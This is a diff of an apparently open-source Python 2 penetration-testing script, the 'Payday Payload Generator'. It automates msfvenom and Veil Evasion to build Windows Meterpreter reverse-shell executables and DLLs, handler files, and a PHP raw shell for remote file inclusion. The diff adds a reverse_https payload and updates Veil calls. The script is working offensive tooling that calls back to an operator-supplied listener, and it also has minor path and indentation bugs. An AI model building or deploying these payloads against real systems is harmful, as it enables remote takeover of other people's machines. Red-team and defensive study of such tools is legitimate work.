@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # Author  : Matt Lorentzen
 # Twitter : @lorentzenman
@@ -7,7 +7,7 @@ import os, sys, time, argparse
 
 def banner():
 
-	version = "the kitchen sink edition"
+	version = "part of the spiderweb"
     
 	banner = """
                        _
@@ -20,7 +20,7 @@ def banner():
                  %s
 """ %version
      
-	print redtxt(banner)
+	print greentxt(banner)
 
 
 def build_tree():
@@ -38,12 +38,11 @@ The following structure is needed for veil output
 	print greentxt(tree_structure)
 
 
-
 def parse_veil_config():
 	""" Loads Veil Configuration file options from /etc/veil/settings.py """
 	# check for veil settings file
 	if not os.path.isfile('/etc/veil/settings.py'):
-		print redtxt("[!] Cannot find the veil settings file. Please check Veil installation.")
+		print redtxt("[!] Cannot find the veil settings file. Please check Veil installation or install using setup.sh inside './Veil/setup/setup.sh' folder")
 	else:
 		vf = open('/etc/veil/settings.py', 'r')
 		for line in vf.readlines():
@@ -68,6 +67,7 @@ def msf_payloads(ip, output_dir, payload_port):
 	payloads.append(["windows/meterpreter/reverse_tcp",payload_port, "exe-service" ,"serv.exe"])
 	payloads.append(["windows/meterpreter/reverse_tcp",payload_port, "dll", "revmetdll.dll"])
 	payloads.append(["windows/x64/meterpreter/reverse_tcp",payload_port, "dll", "revmetdll64.dll"])
+        payloads.append(["windows/x64/meterpreter/reverse_https", payload_port, "exe", "methttpsx64.exe"])
 
 	#./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
 
@@ -82,8 +82,7 @@ def msf_payloads(ip, output_dir, payload_port):
 		print "[!] Generating : " + bluetxt(payload)
 		print "[>] LHOST " + greentxt(ip) + " on port " + greentxt(lport)
 		os.system(venom_cmd)
-		print "[!] Generating handler for : " + bluetxt(payload)
-		# strip off ext and replace with .rc
+		print "[!] Generating handler for : " + bluetxt(payload)# strip off ext and replace with .rc
 
 		handler = ext.split(".")[0] + ".rc"
 		handler_file = open(base + "handlers/" + handler , "w")
@@ -97,17 +96,18 @@ def msf_payloads(ip, output_dir, payload_port):
 		print "[!] Generated : " + yellowtxt(handler) + "\n\n"
 
 
-def veil_payloads(ip, output_dir, move_payloads, veil_script, payload_port):
+def veil_payloads(ip, output_dir, move_payloads, veil_path, payload_port):
 	""" Takes local IP address as LHOST parm and builds Veil payloads"""
 	# Veil doesn't have a custom output directory option and the default path gets pulled from the config file
 	# hacky approach :: copy each generated payload and handler in to the custom output directory if it is supplied
 	# start empty list to hold
+        os.chdir(veil_path)
 	payloads = []
 	# appends payloads with nested 3 value list for dynamic parm calling
-	payloads.append(["cs/meterpreter/rev_https",payload_port, "v_revhttps"])
-	payloads.append(["c/meterpreter/rev_tcp",payload_port,"v_revmet"])
-	payloads.append(["c/meterpreter/rev_http_service",payload_port, "v_revhttp_srv"])
-
+	payloads.append(["10",payload_port, "v_revhttps"])
+	payloads.append(["5",payload_port,"v_revhttp"])
+	payloads.append(["7",payload_port,"v_revmet"])
+	payloads.append(["6",payload_port, "v_revhttp_srv"])
 
 	print "Creating Veil Goodness"
 	for parms in payloads:
@@ -115,8 +115,8 @@ def veil_payloads(ip, output_dir, move_payloads, veil_script, payload_port):
 		payload = parms[0]
 		lport = str(parms[1])
 		output = parms[2]
-		command = ("-p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output + " --overwrite")
-		os.system(veil_script + " " + command)
+		command = ("./Veil.py -t Evasion -p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output + " --ip " + ip)
+		os.system(command)
 		time.sleep(2)
 		# if using a custom output directory, veil doesn't have an option to specify the base directory as it gets this from the conf file
 		# payload generated above has unique 'base' name - access the list and check the boolean flag that is pushed in
@@ -127,6 +127,7 @@ def veil_payloads(ip, output_dir, move_payloads, veil_script, payload_port):
 			os.system("mv /root/payloads/windows/" + output + ".dll "  + output_dir)
 			# move handler
 			os.system("mv /root/payloads/windows/handlers/" + output + "_handler.rc " + output_dir + "handlers")
+
 
 def php_payloads(ip, output_dir, payload_port):
 	""" Creates PHP based raw shell and outputs as txt ready for RFI """
@@ -174,12 +175,10 @@ def php_payloads(ip, output_dir, payload_port):
 	os.remove(str(backup_file))
 
 
-
-
-def clean(payload_path, veil_script):
+def clean(payload_path, veil_path):
 	""" Cleans out directory """
 	# start with default Veil direcory - gets rid of hashes etc
-	os.system(veil_script + " --clean")
+	os.system(veil_path + " --clean")
 	os.system("clear")
  	print yellowtxt("[!] Now cleaning default output directory\n")
 	# clean out generated payloads in default or custom directory
@@ -188,7 +187,6 @@ def clean(payload_path, veil_script):
 		if os.path.isfile(file):
 			print "[!] Removing " + bluetxt(file)
 			os.remove(file)
-
 
 
 def get_payload_output(payload_output_dir):
@@ -242,10 +240,12 @@ def bluetxt(text2colour):
 
 def Main():
 	# program version
-	version = 0.6
+	version = 0.7
 	banner()
-	default_path = '/root/payloads/windows'
-	veil_script = '/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py'
+	curdir = os.path.dirname(__file__)
+        veil_path = os.path.join(curdir, '/Veil/')
+        print veil_path
+        default_path = '/root/payloads/windows'
 
 	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil. Outputs to '/root/payloads/windows/' by default.")
 	parser.add_argument("--veil", action="store_true", help='Veil Payloads')
@@ -302,7 +302,8 @@ def Main():
 			print "[!] IP address required with this payload option :: --veil --ip <Address>"
 		else:
 			print yellowtxt("[!] Encoding Veil payloads")
-			veil_payloads(ip ,output_dir, move_payloads, veil_script, payload_port)
+                        #TODO remove all the original source files in the source directory
+			veil_payloads(ip ,output_dir, move_payloads, veil_path, payload_port)
 
 
 	if args.msf:
@@ -331,7 +332,7 @@ def Main():
 			payload_paths = ["/root/payloads/windows/","/root/payloads/windows/handlers/"]
 			print redtxt("Cleaning out Payload and Handler File directories")
 			for payload_path in payload_paths:
-				clean(payload_path, veil_script)
+				clean(payload_path, veil_path)
 
 
 if __name__ == "__main__":
